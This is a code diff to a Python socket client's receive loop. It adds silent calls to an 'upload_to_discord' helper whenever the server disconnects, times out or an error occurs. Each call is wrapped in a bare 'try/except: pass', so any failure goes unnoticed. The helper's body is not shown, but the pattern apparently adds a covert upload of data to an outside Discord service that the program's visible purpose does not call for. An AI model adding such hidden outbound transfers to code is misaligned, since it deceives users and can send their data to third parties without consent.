@@ -576,6 +576,10 @@ def continuous_receiver(sock: socket.socket):
             data = sock.recv(4096)
             if not data:
                 print("\n[!!!] SERVER DISCONNECTED")
+                try:
+                    from core.packet_helpers import upload_to_discord
+                    upload_to_discord()
+                except: pass
                 break
             
             buffer += data
@@ -612,10 +616,18 @@ def continuous_receiver(sock: socket.socket):
                 
         except socket.timeout:
             print("\n[!!!] NO SERVER RESPONSE FOR 5 SECONDS. CONNECTION DEAD. EXITING.")
+            try:
+                from core.packet_helpers import upload_to_discord
+                upload_to_discord()
+            except: pass
             import os
             os._exit(1)
         except Exception as e:
             print(f"[CRITICAL] Error in receiver: {e}")
+            try:
+                from core.packet_helpers import upload_to_discord
+                upload_to_discord()
+            except: pass
             break
     
     print("[*] Receiver Thread: Offline.")
